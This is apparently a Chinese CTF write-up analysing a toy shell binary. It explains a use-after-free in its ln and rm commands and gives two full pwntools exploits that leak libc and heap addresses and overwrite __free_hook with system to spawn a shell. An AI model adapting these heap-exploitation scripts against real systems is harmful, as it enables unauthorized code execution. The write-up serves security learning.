---
title: pwnable_start
date: 2023-03-12 23:14:01
categories: 
- pwn_wp
tags: 
- pwn
- heap



---

感觉是一个有问题的shell，应该是UAF。

<!--more-->

64位保护全开，写的是一个shell。

输入以空格`' '`分割三个参数，存储在bss段中处理。

代码有很多干扰

```c
__int64 func()
{
  int i; // [rsp+8h] [rbp-8h]
  int j; // [rsp+8h] [rbp-8h]
  int k; // [rsp+8h] [rbp-8h]
  int ii; // [rsp+8h] [rbp-8h]
  int jj; // [rsp+8h] [rbp-8h]
  int kk; // [rsp+8h] [rbp-8h]
  int m; // [rsp+Ch] [rbp-4h]
  int n; // [rsp+Ch] [rbp-4h]
  int mm; // [rsp+Ch] [rbp-4h]

  if ( !parameter1[0] )                         // 如果参数1为空则进入
  {
    puts("command is NULL!!!");
    return 0LL;
  }
  if ( !strcmp(parameter1, "ls") )              // 如果参数1是ls
  {
    for ( i = 0; i <= 79; ++i )                 // 输入一个列表
    {
      if ( *(&file_flag + 6 * i) == 1LL )       // *(base+6*i)==1则输出
        printf("%s ", &file_flag + 48 * i + 8); // 输入base+48*i+8指向的内容
    }
    putchar('\n');                              // 输出'\n'
    return 0LL;
  }
    
  if ( !strcmp(parameter1, "cat") )             // cat指令
  {
    if ( parameter2[0] )                        // 如果第二个参数有内容
    {
      for ( j = 0; j <= 79; ++j )
      {
        if ( !strcmp(parameter2, &file_flag + 48 * j + 8) )// base+48*j+8处的内容与参数2相同
        {
          if ( *(&file_flag + 6 * j) == 1LL )   // base+6*j指向内容为1，否则说明no file
          {
            puts(file_data[6 * j]);             // 输出base2+6*i处的qword
            return 0LL;
          }
LABEL_223:
          puts("NO FILE");
          return 0LL;
        }
      }
      goto LABEL_223;
    }                                           // no file
    goto LABEL_711;
  }                                             // filename is null
    
  if ( !strcmp(parameter1, "touch") )           // touch指令
  {

    if ( parameter2[0] )                        // 第二个参数有值
    {
      for ( k = 0; k <= 79; ++k )
      {
        if ( !*(&file_flag + 6 * k) )           // 如果原本为空
        {
          *(&file_flag + 6 * k) = 1LL;          // 使*(base+6*k)=1,表示有文件
          file_data[6 * k] = malloc(0x208uLL);
          read_buf(file_data[6 * k], 0x208uLL); // 读入文件内容
          strcpy(&file_flag + 48 * k + 8, parameter2);// 将参数2的内容(file name)复制到file_flag+48*k+8
          return 0LL;
        }
      }
LABEL_807:
      puts("Maximum number of files. Please delete the file.");// 文件最多80个
      return 0LL;
    }
LABEL_711:
    puts("file_name is NULL");                  // 第二个参数是filename
    return 0LL;
  }
    
  if ( !strcmp(parameter1, "cp") )              // 复制
  {
    if ( !parameter2[0] || !parameter3[0] )     // filename为空
      goto LABEL_711;
    if ( !strcmp(parameter2, &file_flag + 8) && file_flag == 1LL )// 第1个file存在且filename与参数2相同
    {
      for ( m = 0; m <= 79; ++m )
      {
        if ( !strcmp(parameter3, &file_flag + 48 * m + 8) )// 存在一个filename与参数3相同
        {
          strncpy(file_data[6 * m], file_data[0], 0x208uLL);// 复制文件内容，第1个到第m个
          return 0LL;
        }
      }
      for ( n = 0; ; ++n )                      //没有同名的file,检查有没有空余位置,有则复制到新文件
      {
        if ( n > 79 )                           // 文件太多
          goto LABEL_807;
        if ( !*(&file_flag + 6 * n) )
          break;
      }
      *(&file_flag + 6 * n) = 1LL;              // 写入标志位
      file_data[6 * n] = malloc(0x208uLL);		// 分配data的空间
      strcpy(&file_flag + 48 * n + 8, parameter3); // 复制第三个参数到filename
      strncpy(file_data[6 * n], file_data[0], 0x208uLL); // 复制data
      return 0LL;
    }
    goto LABEL_840; 							// 文件不存在
  }
    
  if ( !strcmp(parameter1, "gedit") )			// gedit指令
  {
    if ( !parameter2[0] )						// 文件名为null
      goto LABEL_711;
    for ( ii = 0; ; ++ii )						
    {
      if ( ii > 79 )
        goto LABEL_840;							// 文件不存在
      if ( !strcmp(parameter2, &file_flag + 48 * ii + 8) ) // 比较参数二和文件名
        break;
    }
    if ( *(&file_flag + 6 * ii) == 1LL )				// 文件已经存在
    {
      read_buf(file_data[6 * ii], 0x200uLL);			// 写入0x200byte的data
      return 0LL;
    }
    goto LABEL_840;								// 文件不存在
  }
    
  if ( !strcmp(parameter1, "rm") )				// 删除
  {
    if ( !parameter2[0] )						// 文件名为null
    {
      goto LABEL_711;
    }
    for ( jj = 0; ; ++jj )
    {
      if ( jj > 79 )
        goto LABEL_840;						// 文件不存在
      if ( !strcmp(parameter2, &file_flag + 48 * jj + 8) ) // 比较参数二和文件名
        break;
    }
    if ( *(&file_flag + 6 * jj) == 1LL ) // 文件已经存在
    {
      free(file_data[6 * jj]); 			// free并赋0
      file_data[6 * jj] = 0LL;
      *(&file_flag + 6 * jj) = 0LL;		// 清空标志位
      return 0LL;					  // 文件名没管，不知道有无影响
    }
    goto LABEL_840;						// 文件不存在
  }
    
  if ( strcmp(parameter1, "ln") )							// ln指令
    return 0LL;
  if ( !parameter2[0] )									// 文件名为null
    goto LABEL_711;
  if ( !parameter3[0] )									// 文件名为null
    goto LABEL_711;
  for ( kk = 0; ; ++kk )
  {
    if ( kk > 79 )
    {
      goto LABEL_840;									// 文件不存在
    }
    if ( !strcmp(parameter2, &file_flag + 48 * kk + 8) )	// 找参数二对应的文件名
      break;
  }
  if ( *(&file_flag + 6 * kk) != 1LL )				// 标志位为0
  {
LABEL_840:
    printf("file:%s is not exist;", parameter2);	// 文件不存在
    return 0LL;
  }
  for ( mm = 0; ; ++mm )
  {
    if ( mm > 79 )
      goto LABEL_807;								// 文件太多了
    if ( !*(&file_flag + 6 * mm) )					// 找到一个空位
      break;
  }
  strcpy(&file_flag + 48 * mm + 8, parameter3);		// 复制第三个参数到file name
  *(&file_flag + 6 * mm) = 1LL;					// 标志位设1
  file_data[6 * mm] = file_data[6 * kk];		// copy data,从p2到p3
  return 0LL;
}
```

由上可以大概看出这个shell的功能：

```
ls: 输出所有flag为1的filename
cat p2: 输出p2指定filename的filedata 
touch p2: 创建p2指定filename的文件，并输入文件内容(最大0x208byte) 
cp p2 p3: 将名为p2的file复制到名为p3的file中，若不存在名为p3的文件则新建，p2必须是第一个文件的文件名 
gedit p2: 修改名为p2的file的内容(最多0x200byte)
rm p2: 删除名为p2的file，对标志位和chunk指针赋0
ln p2 p3: 将名为p2的file的filedata复制到一个新的名为p3的file中 (复制chunk指针)

filedata_base: 0xa0e8 qword[6*i] 一个0x208byte
fileflag_base: 0xa0c0 
fileflag_base+6*i: flag,==1表示文件存在，==0表示文件不存在
fileflag_base+48*i+8: filaname
```

可以看到存在UAF：ln可将同一个`chunk`指针挂载到多个`file`中，但`rm`删除是按照`filename`删除一个`file`，仍可通过其他`file`控制该`chunk`指针。

如果这样的话首先利用`unsorted bin`泄露出堆指针和libcbase， 之后利用`UAF`走`tcache poison`劫持`free_hook`来`get shell`。

本地还能用下`one_gadget`，远程估计只能通过`malloc_hook`用'LibcSearcher'搜`libc`，之后走`system(""/bin/sh\x00")`。

本地exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='sh_v1.1'
elf=ELF('./'+filename)
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('./libc-2.31.so')
p=process('./'+filename)
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
p=remote('121.40.89.206',34883)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
def ls():
  ru('>>>>')
  sl('ls')
  return ru('\n')

def cat(filename):
  ru('>>>>')
  sl('cat '+str(filename))

def touch(filename,filedata):
  ru('>>>>')
  sl('touch '+str(filename))
  sl(str(filedata))

def gedit(filename,filedata):
  ru('>>>>')
  sl('gedit '+str(filename))
  sl(str(filedata))

def rm(filename):
  ru('>>>>')
  sl('rm '+str(filename))

def ln(src,dest):
  ru('>>>>')
  sl('ln '+str(src)+' '+str(dest))


# fill in tcache
# file0 --> file6
for i in range(7):
  touch('file'+str(i),'aaaaaaaa')

# use to leak libc
# file7 == file8
touch('file7','bbbbbbbb')
ln('file7','file8')
touch('file9','cccccccc') # escape for being combined into top chunk
# use to leak heap
# file1 == file10
ln('file1','file10')

# fill in tcache
for i in range(7):
  rm('file'+str(i))

# leak libc
rm('file7')
# debug()
cat('file8')
libc_addr=uu64(ru('\n')[:-1])
malloc_hook=libc_addr-96-0x10
libcbase=malloc_hook-libc.sym['__malloc_hook']
free_hook=libcbase+libc.sym['__free_hook']
sys_addr=libcbase+libc.sym['system']

# leak heap addr
cat('file10')
heapbase=uu64(ru('\n')[:-1])-0x2a0

# overwrite free hook
payload=p64(free_hook)
payload=payload.ljust(0x20,b'\x00')
  
gedit('file10',payload)

# get tcache
for i in range(6):
  touch('file'+str(11+i),'aaaaaaaa')

leak('sys_addr',hex(sys_addr))
leak('malloc_hook',hex(malloc_hook))
leak('free_hook',hex(free_hook))
leak('libcbase',hex(libcbase))
leak('heapbase',hex(heapbase))
# debug()

# get free_hook
payload=p64(sys_addr)
touch('file17',payload)

touch('file18','/bin/sh\x00')
# debug()
rm('file18')

itr()

```

远程exp:

```py
from pwn import*
from LibcSearcher import*
context(log_level='debug',os='linux',arch='amd64')
filename='sh_v1.1'
elf=ELF('./'+filename)
# libc=ELF('./libc-2.31.so')
# p=process('./'+filename)
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
p=remote('121.40.89.206',34883)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
def ls():
  ru('>>>>')
  sl('ls')
  return ru('\n')

def cat(filename):
  ru('>>>>')
  sl('cat '+str(filename))

def touch(filename,filedata):
  ru('>>>>')
  sl('touch '+str(filename))
  sl(str(filedata))

def gedit(filename,filedata):
  ru('>>>>')
  sl('gedit '+str(filename))
  sl(str(filedata))

def rm(filename):
  ru('>>>>')
  sl('rm '+str(filename))

def ln(src,dest):
  ru('>>>>')
  sl('ln '+str(src)+' '+str(dest))


# fill in tcache
# file0 --> file6
for i in range(7):
  touch('file'+str(i),'aaaaaaaa')

# use to leak libc
# file7 == file8
touch('file7','bbbbbbbb')
ln('file7','file8')
touch('file9','cccccccc') # escape for being combined into top chunk
# use to leak heap
# file1 == file10
ln('file1','file10')

# fill in tcache
for i in range(7):
  rm('file'+str(i))

# leak libc
rm('file7')
# debug()
cat('file8')
libc_addr=uu64(ru('\n')[:-1])
malloc_hook=libc_addr-96-0x10

# leak heap addr
cat('file10')
heapbase=uu64(ru('\n')[:-1])-0x2a0


libc=LibcSearcher('__malloc_hook',malloc_hook)
libcbase=malloc_hook-libc.dump('__malloc_hook')
free_hook=libcbase+libc.dump('__free_hook')
sys_addr=libcbase+libc.dump('system')

leak('sys_addr',hex(sys_addr))
leak('malloc_hook',hex(malloc_hook))
leak('free_hook',hex(free_hook))
leak('libcbase',hex(libcbase))
leak('heapbase',hex(heapbase))

# overwrite free_hook
payload=p64(free_hook)
payload=payload.ljust(0x20,b'\x00')
  
gedit('file10',payload)

# get tcache
for i in range(6):
  touch('file'+str(11+i),'aaaaaaaa')

# debug()

# get free_hook
payload=p64(sys_addr)
touch('file17',payload)

# get shell
touch('file18',b'/bin/sh\x00')
rm('file18')

itr()

```

